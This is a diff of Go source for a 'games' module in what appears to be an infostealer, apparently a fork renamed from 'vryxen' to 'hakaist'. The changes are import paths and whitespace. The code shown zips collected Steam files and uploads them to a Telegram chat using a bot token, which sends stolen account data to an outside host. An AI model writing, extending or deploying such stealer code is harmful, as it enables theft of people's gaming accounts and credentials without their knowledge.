@@ -2,12 +2,13 @@ package games
 
 import (
 	"fmt"
-	"github.com/unf6/vryxen/pkg/utils/fileutil"
-	"github.com/unf6/vryxen/pkg/utils/requests"
-	"github.com/unf6/vryxen/pkg/utils/common"
 	"os"
 	"path/filepath"
 	"strings"
+
+	"github.com/lukyydnv/hakaist/pkg/utils/common"
+	"github.com/lukyydnv/hakaist/pkg/utils/fileutil"
+	"github.com/lukyydnv/hakaist/pkg/utils/requests"
 )
 
 func Run(botToken, chatId string) {
@@ -115,5 +116,5 @@ func Run(botToken, chatId string) {
 	defer os.Remove(tempZip)
 
 	requests.Send2TelegramMessage(botToken, chatId, "Steam")
-    requests.Send2TelegramDocument(botToken, chatId, tempZip)
+	requests.Send2TelegramDocument(botToken, chatId, tempZip)
 }
